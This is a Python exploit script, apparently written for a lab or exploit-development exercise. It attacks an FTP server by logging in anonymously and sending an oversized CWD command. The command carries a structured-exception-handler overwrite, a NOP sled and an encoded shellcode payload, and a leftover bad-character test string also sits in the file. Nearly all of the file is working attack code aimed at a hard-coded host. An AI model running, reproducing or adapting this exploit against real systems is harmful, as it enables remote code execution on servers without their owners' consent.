# exploit.py - exploit scratch for launching the exploit
# author : @shipcod3
 
import socket
import sys

seh="\x1e\x40\x20\x12"
nseh="\xeb\x07\x90\x90"

buf =  b""
buf += b"\xba\xa8\x9a\xa1\xf9\xd9\xf6\xd9\x74\x24\xf4\x5e\x29"
buf += b"\xc9\xb1\x53\x83\xc6\x04\x31\x56\x0e\x03\xfe\x94\x43"
buf += b"\x0c\x02\x40\x01\xef\xfa\x91\x66\x79\x1f\xa0\xa6\x1d"
buf += b"\x54\x93\x16\x55\x38\x18\xdc\x3b\xa8\xab\x90\x93\xdf"
buf += b"\x1c\x1e\xc2\xee\x9d\x33\x36\x71\x1e\x4e\x6b\x51\x1f"
buf += b"\x81\x7e\x90\x58\xfc\x73\xc0\x31\x8a\x26\xf4\x36\xc6"
buf += b"\xfa\x7f\x04\xc6\x7a\x9c\xdd\xe9\xab\x33\x55\xb0\x6b"
buf += b"\xb2\xba\xc8\x25\xac\xdf\xf5\xfc\x47\x2b\x81\xfe\x81"
buf += b"\x65\x6a\xac\xec\x49\x99\xac\x29\x6d\x42\xdb\x43\x8d"
buf += b"\xff\xdc\x90\xef\xdb\x69\x02\x57\xaf\xca\xee\x69\x7c"
buf += b"\x8c\x65\x65\xc9\xda\x21\x6a\xcc\x0f\x5a\x96\x45\xae"
buf += b"\x8c\x1e\x1d\x95\x08\x7a\xc5\xb4\x09\x26\xa8\xc9\x49"
buf += b"\x89\x15\x6c\x02\x24\x41\x1d\x49\x21\xa6\x2c\x71\xb1"
buf += b"\xa0\x27\x02\x83\x6f\x9c\x8c\xaf\xf8\x3a\x4b\xcf\xd2"
buf += b"\xfb\xc3\x2e\xdd\xfb\xca\xf4\x89\xab\x64\xdc\xb1\x27"
buf += b"\x74\xe1\x67\xdd\x7c\x44\xd8\xc0\x81\x36\x88\x44\x29"
buf += b"\xdf\xc2\x4a\x16\xff\xec\x80\x3f\x68\x11\x2b\x3b\xbb"
buf += b"\x9c\xcd\x29\x2b\xc9\x46\xc5\x89\x2e\x5f\x72\xf1\x04"
buf += b"\xf7\x14\xba\x4e\xc0\x1b\x3b\x45\x66\x8b\xb0\x8a\xb2"
buf += b"\xaa\xc6\x86\x92\xbb\x51\x5c\x73\x8e\xc0\x61\x5e\x78"
buf += b"\x60\xf3\x05\x78\xef\xe8\x91\x2f\xb8\xdf\xeb\xa5\x54"
buf += b"\x79\x42\xdb\xa4\x1f\xad\x5f\x73\xdc\x30\x5e\xf6\x58"
buf += b"\x17\x70\xce\x61\x13\x24\x9e\x37\xcd\x92\x58\xee\xbf"
buf += b"\x4c\x33\x5d\x16\x18\xc2\xad\xa9\x5e\xcb\xfb\x5f\xbe"
buf += b"\x7a\x52\x26\xc1\xb3\x32\xae\xba\xa9\xa2\x51\x11\x6a"
buf += b"\xc2\xb3\xb3\x87\x6b\x6a\x56\x2a\xf6\x8d\x8d\x69\x0f"
buf += b"\x0e\x27\x12\xf4\x0e\x42\x17\xb0\x88\xbf\x65\xa9\x7c"
buf += b"\xbf\xda\xca\x54"

#badchars='\x00'
badchar = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")




evil = "A"*1037
evil+=nseh
evil+=seh
evil+="\x90"*20
evil+=buf
evil+="D"*(3000-len(evil))

 
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('10.250.95.19',21))
 
s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('CWD ' + evil + '\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.close
